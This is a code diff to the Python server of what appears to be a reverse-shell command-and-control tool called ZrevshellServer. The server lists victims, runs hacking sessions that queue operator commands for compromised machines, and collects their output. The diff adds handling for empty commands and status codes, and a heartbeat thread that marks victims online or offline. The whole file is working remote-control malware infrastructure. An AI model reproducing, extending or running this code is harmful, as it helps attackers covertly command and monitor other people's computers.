@@ -3,6 +3,8 @@
 # ---- imports
 import json as js
 import sys
+import threading as th
+import time as tm
 from binascii import Error as b64decodeError
 from functools import partial
 from http import HTTPMethod, HTTPStatus
@@ -69,8 +71,8 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
     # ----------Utility methods ---------- #
 
-    def c_send_error(self, code: HTTPStatus, message=None, explain=None):
-        self.send_error(code, message, explain)
+    def c_send_error(self, code: HTTPStatus):
+        self.send_response(code)
         self.end_headers()
 
     def check_verified_request(self):
@@ -253,7 +255,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 for victim_info in victims
                 if not self.hacking_sessions.check_client_in_session(
                     victim_info[0]
-                )  # Means filtering the ones that are currently in a session
+                )  # Means filtering the ones that are currently in a session out
             ]
         )
 
@@ -303,7 +305,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 return sh.HandlerResponse(False, HTTPStatus.CONFLICT)
         # If our user is valid then we can maybe add him to the database
         client_insert_op = self.database.execute(
-            "INSERT INTO clients VALUES(?, ?, 1)", [client_id, client_type]
+            "INSERT INTO clients VALUES(?, ?, 0.0, 1)", [client_id, client_type]
         )
         if client_insert_op is None:
             # Some kinda SQL error happened so let's send a internal server error message
@@ -424,9 +426,18 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         session_id = data.get("session_id", None)
         response = data.get("response", None)
+        is_empty = data.get("empty", None)
+        command_status_code = data.get(
+            "command_status_code", False
+        )  # Since it is already none
 
         # Check if the necessary keys are not present in the dictionary sent
-        if session_id is None or response is None:
+        if (
+            session_id is None
+            or response is None
+            or command_status_code is False
+            or is_empty is None
+        ):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
         # Session validation
@@ -439,8 +450,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if not is_valid_session:
             return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
-        # Ok else, let's send the success code and insert the response in the session
-        self.hacking_sessions.insert_response(session_id, response)
+        if not is_empty:
+            if command_status_code is not None:
+                response = command_status_code
+            # Ok else, let's send the success code and insert the response in the session
+            self.hacking_sessions.insert_response(session_id, response)
 
         return sh.HandlerResponse(True, HTTPStatus.OK)
 
@@ -465,8 +479,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         session_id = data.get("session_id", None)
         command = data.get("command", None)
+        empty = data.get("empty", None)
 
-        if session_id is None or command is None:
+        if session_id is None or command is None or empty is None:
             return bad_request
 
         # Session validation
@@ -474,9 +489,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if not is_valid_session:
             return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
 
-        # If we are in session with the victim and satisfy all the other requirements
-        # we can proceed by inserting the command in the session comm.
-        self.hacking_sessions.insert_command(session_id, command)
+        if not empty:
+            # If we are in session with the victim and satisfy all the other requirements
+            # we can proceed by inserting the command in the session comm.
+            self.hacking_sessions.insert_command(session_id, command)
 
         # If all went good, lets once again return the OK response
         return sh.HandlerResponse(True, HTTPStatus.CREATED)
@@ -528,7 +544,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         **kwargs,
     ):
         """This method is in charge of handling any server command, provided the handler_function which handles the work done for the server command.
-        This method will get the body of the request and validate if the client is eligible of accessing the command. The function will send responses with the client when needed either it be an error or not. the handler_function should accept the and client_id, req_body. The rest arguments and keyword arguments will be passed to the handler_func. req_body will be set to None if there is an error parsing the body.
+        This method will get the body of the request and validate if the client is eligible of accessing the command. The function will send responses with the client when needed either it be an error or not. the handler_function should accept the client_id, client_type and req_body. The rest arguments and keyword arguments will be passed to the handler_func. req_body will be set to None if there is an error parsing the body of the request.
         """
         legit_client = False
 
@@ -580,10 +596,23 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             self.c_send_error(HTTPStatus.UNAUTHORIZED)
             return
 
-        # Now let's get the post request body of the request according to validate_req_body function
+        print(f"command: {command} executed")
+        if command != "register":
+            # Update the status and last checked time of
+            # the client.
+
+            rt = self.database.execute(
+                "UPDATE clients SET last_requested=? WHERE client_id=?",
+                (tm.time(), client_id),
+            )
+            if rt is None:
+                self.c_send_error(HTTPStatus.INTERNAL_SERVER_ERROR)
+                return
+
+        # Now let's get the  body of the request according to validate_req_body function
         body = self.get_req_body()
 
-        # Having the post request ready and having a legit client let's execute
+        # Having the request body ready and having a legit client let's execute
         # the handler for the command.
         result: sh.HandlerResponse = handler_func(
             *args, client_id=client_id, client_type=client_type, req_body=body, **kwargs
@@ -591,13 +620,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Now we will send what the result sends, the result is expected to be
         # HandlerResponse which is easier to maintain.
-        if result.successful is True:
-            self.send_response(result.res_code)
-            for header, value in result.headers.items():
-                self.send_header(header, value)
-            self.end_headers()
-        else:
-            self.c_send_error(result.res_code)
+        self.send_response(result.res_code)
+        for header, value in result.headers.items():
+            self.send_header(header, value)
+        self.end_headers()
 
         # let's add the body if provided in the
         # response by the handler_func
@@ -679,6 +705,50 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def do_DELETE(self):
         """Handle DELETE requests."""
         self.main_handler(HTTPMethod.DELETE)
+
+
+def check_pulse(database: sh.Database, interval: int, stop_event: th.Event):
+    """Check the pulse of the clients using the time. The interval determines the time a
+    client can stay online without being flagged offline. if stop_event is true it marks
+     the end of the thread."""
+
+    while not stop_event.is_set():
+        # Read every client from the database and if their
+        # time gap is greater than the interval set the time
+        clients = database.query(
+            "SELECT client_id, last_requested, status FROM clients",
+            raise_for_error=True,
+        )
+
+        if clients is None:
+            # This will probably never happen
+            return
+
+        for client_id, last_requested, status in clients:
+            if last_requested == 0.0:
+                continue
+
+            if (abs(tm.time() - last_requested) > interval) and status == 1:
+                # Ok this means the client got himself in a timeout error
+                # so let's set the status to 0
+                print(f"Updating pulse...{client_id} to 0")
+                database.execute(
+                    "UPDATE clients SET status=0 WHERE client_id=?",
+                    (client_id,),
+                    raise_for_error=True,
+                )
+
+            elif (abs(tm.time() - last_requested) < interval) and status == 0:
+                # Ok this means the client got himself in a timeout error
+                # so let's set the status to 0
+                print(f"Updating pulse...{client_id} to 1")
+                database.execute(
+                    "UPDATE clients SET status=1 WHERE client_id=?",
+                    (client_id,),
+                    raise_for_error=True,
+                )
+
+        tm.sleep(3)
 
 
 def run_server(
@@ -764,8 +834,23 @@ def main():
     # Creating our sessions
     sessions = sh.Sessions()
 
+    # The event that tells the check_pulse thread
+    # to stop
+    stop_event = th.Event()
+
+    # Start the pulse check thread
+    check_pulse_thread = th.Thread(
+        target=check_pulse,
+        args=(configuration.database, configuration.client_offline_limit, stop_event),
+    )
+    check_pulse_thread.daemon = True
+    check_pulse_thread.start()
+
     # Let's rockin roll
     run_server(configuration, sessions)
+    stop_event.set()
+    # Closing the database connection
+    configuration.database.session_data.close()
 
 
 if __name__ == "__main__":
